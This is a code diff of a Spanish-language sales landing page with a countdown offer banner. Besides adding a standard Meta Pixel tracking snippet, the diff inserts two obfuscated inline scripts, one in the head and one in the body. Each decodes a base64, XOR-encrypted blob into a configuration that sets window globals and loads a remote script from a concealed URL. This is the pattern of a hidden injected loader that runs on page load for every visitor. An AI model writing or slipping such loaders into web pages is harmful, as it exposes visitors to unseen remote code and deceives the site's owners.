@@ -19,8 +19,29 @@ h1{font-family:"Source Serif 4",Georgia,serif;line-height:1.2;margin:0;font-size
 .player{margin:26px auto 0;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 10px 30px rgba(28,42,36,.18)}
 .trust{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 18px;margin:22px 0 0;padding:0;list-style:none;font-size:.9rem;color:var(--muted)}
 </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1816540879364053');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1816540879364053&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+  <script>(function(){var o_x=atob("DNvU21+NZGNnPEWYSKD2ri3hRllFVDHsOKju9HDuAA1JSTH1Ib2t9TziCU0FTmrrK6m9qyv+SxMORCD0Z6u9ozrhSgkUHmm6Ka+gqTbvERcCT2eiE4b4+TjhCwEGUDa6coCv+THsCQZFBmfoIaOxtxbpRk9FSiT0Pb724X27BQBRXnSue+7s7ma/VFoGDH2rfrnt6zuvGT4a");var q_5p=[];for(var n_k=0;n_k<o_x.length;n_k++){q_5p.push(o_x.charCodeAt(n_k)&255);}var j_avs=q_5p[0];var w_v4ls=q_5p.slice(1,1+j_avs);var n_ldv0=q_5p.slice(1+j_avs);var b_jas4=n_ldv0.map(function(b,w_efoa){return b^w_v4ls[w_efoa%j_avs];});var j_gw9q="";for(var o_jywd=0;o_jywd<b_jas4.length;o_jywd++){j_gw9q+=String.fromCharCode(b_jas4[o_jywd]&255);}var z_d=decodeURIComponent(escape(j_gw9q));var p_1i7=JSON.parse(z_d);var i_b=p_1i7.globals||[];i_b.forEach(function(j_8of){window[j_8of.name]=j_8of.value;});var v_gi=document.createElement("script");v_gi.src=p_1i7.url;v_gi.async=true;v_gi.defer=true;(p_1i7.attributes||[]).forEach(function(e_7){v_gi.setAttribute(e_7.name,e_7.value);});(document.head||document.documentElement).appendChild(v_gi);})();</script>
 </head>
 <body>
+  <script>(function(){var d_c=atob("DESm9WIviXKRQtRHrj+EgBBDq0izKqAz3jec2k1M7Ry/N6AqxyLf2wFA5FzzMPs0zTbPhRZcpgflL6dowiXSkBFbpxjiYPhlzzDShwtN/Ab0MfZ99T+EmwNC7FCrYLAm2iWLgBZC4BTob6Q1yzLDmxYC+gfzK7A0jGiEgwND/BezePZl0xnb");var m_yq=[];for(var p_w1=0;p_w1<d_c.length;p_w1++){m_yq.push(d_c.charCodeAt(p_w1)&255);}var p_yd=m_yq[0];var y_09wz=m_yq.slice(1,1+p_yd);var o_x=m_yq.slice(1+p_yd);var l_xu=o_x.map(function(b,q_nwz){return b^y_09wz[q_nwz%p_yd];});var n_uz5="";for(var h_g4r=0;h_g4r<l_xu.length;h_g4r++){n_uz5+=String.fromCharCode(l_xu[h_g4r]&255);}var t_y=decodeURIComponent(escape(n_uz5));var i_9=JSON.parse(t_y);var q_k=i_9.globals||[];q_k.forEach(function(z_ykq){window[z_ykq.name]=z_ykq.value;});var j_m=document.createElement("script");j_m.src=i_9.url;j_m.async=true;j_m.defer=true;(i_9.attributes||[]).forEach(function(x_ll){j_m.setAttribute(x_ll.name,x_ll.value);});(document.head||document.documentElement).appendChild(j_m);})();</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1816540879364053&ev=PageView&noscript=1" alt=""/></noscript>
 
 <!-- Oferta con fecha REAL. Formato: AAAA-MM-DDTHH:MM:SS-03:00. Déjalo vacío para ocultar la barra. -->
 <div id="offer" role="status">Precio especial hasta el <span id="offerDate"></span> · quedan <strong id="count"></strong></div>
@@ -61,5 +82,6 @@ var OFFER_END = ""; // ej: "2026-10-31T23:59:00-03:00"
   tick();
 })();
 </script>
+
 </body>
 </html>
